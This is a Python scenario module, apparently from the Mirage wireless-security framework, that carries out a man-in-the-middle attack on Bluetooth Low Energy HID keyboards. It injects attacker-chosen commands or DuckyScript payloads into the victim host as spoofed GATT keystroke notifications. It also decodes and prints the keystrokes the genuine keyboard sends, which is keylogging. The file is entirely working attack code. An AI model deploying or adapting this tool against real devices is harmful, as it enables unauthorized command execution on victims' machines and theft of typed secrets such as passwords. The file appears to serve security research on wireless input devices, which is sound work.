from errno import errorcode
import threading
from enum import IntEnum
from mirage.core import scenario
from mirage.libs import io, ble, utils, wireless
from mirage.libs.common import parsers
from mirage.libs.ble_utils.dissectors import *
from mirage.libs.ble_utils.sc_crypto import CryptoUtils


class BLEMitmStage(IntEnum):
    SCAN = 1
    CLONE = 2
    WAIT_CONNECTION = 3
    MASTER_CONNECTION = 4
    ACTIVE_MITM = 5
    STOP = 6


class ble_hid_mitm(scenario.Scenario):
    def onStart(self):
        if self.module.args["INTERFACE2"] == "":
            io.fail("This scenario requires two interfaces!")
            self.module.setStage(self.module.BLEStage.STOP)
            return

        # Local and remote address
        self.sLocalAddress = CryptoUtils.getRandomAddress()
        # Use random address as public identity address
        self.sLocalAddressType = 1
        self.sRemoteAddress = utils.addressArg(self.args["TARGET"])
        self.sRemoteAddressType = 0 if self.args["CONNECTION_TYPE"] == "public" else 1

        # Get command from args
        if not self.args["COMMAND"] and not self.args["DUCKYSCRIPT"]:
            io.fail("This scenario requires a command or duckyscript to execute!")
            self.module.setStage(BLEMitmStage.STOP)
            return

        self.hidMap = HIDMapping(locale="de")

        if self.args["COMMAND"]:
            io.info("Command injection: " + self.args["COMMAND"])
            self.command = self.args["COMMAND"]
            # io.info("You can start the injection by pressing [SPACE]")
        elif self.args["DUCKYSCRIPT"]:
            io.info("Duckyscript injection: " + self.args["DUCKYSCRIPT"])
            parser = parsers.DuckyScriptParser(filename=self.args["DUCKYSCRIPT"])
            self.attackStream = parser.generatePackets(
                textFunction=self.addHIDoverGATTText,
                initFunction=self.startHIDoverGATTInjection,
                keyFunction=self.addHIDoverGATTKeystroke,
                sleepFunction=self.addHIDoverGATTDelay,
            )

        # Create a lock to protect the command execution
        self.lock = threading.Lock()

        return True

    def onEnd(self, result):
        return True

    def onKey(self, key):
        if key == "esc":
            self.module.setStage(BLEMitmStage.STOP)
            return False

        if self.args["DUCKYSCRIPT"] and key == "1":
            self.lock.acquire()
            for o in self.attackStream:
                self.module.a2mEmitter.sendp(o)
            # Command was executed
            self.lock.release()
        elif self.args["COMMAND"] and key == "1":
            isCtrlKey = False
            keyGroup = []
            ctrlKey = ""
            for character in self.command:
                io.warning(f"Sending {character}")
                if character == "[":
                    isCtrlKey = True
                elif character == "]":
                    if ctrlKey == "sleep":
                        utils.wait(seconds=0.4)
                    else:
                        keyGroup.append(ctrlKey)
                        ctrl = True if "ctrl" in keyGroup else False
                        shift = True if "shift" in keyGroup else False
                        gui = True if "gui" in keyGroup else False
                        alt = True if "alt" in keyGroup else False
                        key = keyGroup[len(keyGroup) - 1]
                        self.sendGATTKeystroke(
                            key=key, alt=alt, ctrl=ctrl, shift=shift, gui=gui
                        )

                    isCtrlKey = False
                    ctrlKey = ""
                    keyGroup = []
                elif isCtrlKey:
                    if character == "-":
                        keyGroup.append(ctrlKey)
                        ctrlKey = ""
                    else:
                        ctrlKey = ctrlKey + character
                else:
                    self.sendGATTKeystroke(key=character)

        return False

    def sendGATTKeystroke(
        self, locale="de", key="a", ctrl=False, alt=False, gui=False, shift=False
    ):
        keystrokes = []
        keystrokePressed = ble.HIDoverGATTKeystroke(
            locale=locale, key=key, ctrl=ctrl, alt=alt, gui=gui, shift=shift
        )
        keystrokeReleased = bytes([0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0])
        # 0000000000000000000000
        packet = ble.BLEHandleValueNotification(
            handle=0x0013, value=keystrokePressed.data
        )
        self.module.a2mEmitter.sendp(packet)
        self.module.a2mEmitter.sendp(
            ble.BLEHandleValueNotification(handle=0x0013, value=keystrokeReleased)
        )
        return keystrokes

    def addHIDoverGATTKeystroke(
        self, locale="de", key="a", ctrl=False, alt=False, gui=False, shift=False
    ):
        keystrokes = []
        keystrokePressed = ble.HIDoverGATTKeystroke(
            locale=locale, key=key, ctrl=ctrl, alt=alt, gui=gui, shift=shift
        )
        keystrokeReleased = bytes([0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0])
        keystrokes.append(
            ble.BLEHandleValueNotification(handle=0x0013, value=keystrokePressed.data)
        )
        keystrokes.append(wireless.WaitPacket(time=0.004))
        keystrokes.append(
            ble.BLEHandleValueNotification(handle=0x0013, value=keystrokeReleased)
        )
        # TODO: Maybe add wait packet also here
        return keystrokes

    def startHIDoverGATTInjection(self):
        return []

    def addHIDoverGATTDelay(self, duration=1000):
        keystrokes = []
        keystrokes.append(wireless.WaitPacket(time=0.0001 * duration))
        return keystrokes

    def addHIDoverGATTText(self, string="hello world !", locale="de"):
        keystrokes = []
        for letter in string:
            keystrokes += self.addHIDoverGATTKeystroke(key=letter, locale=locale)
        return keystrokes

    def onSlaveHandleValueNotification(self, packet):
        if packet.handle == 0x0013:
            key = self.hidMap.getKeyFromHIDCode(
                modifiers=packet.value[0], hid=packet.value[1]
            )
            if key:
                io.success(key)
        return True
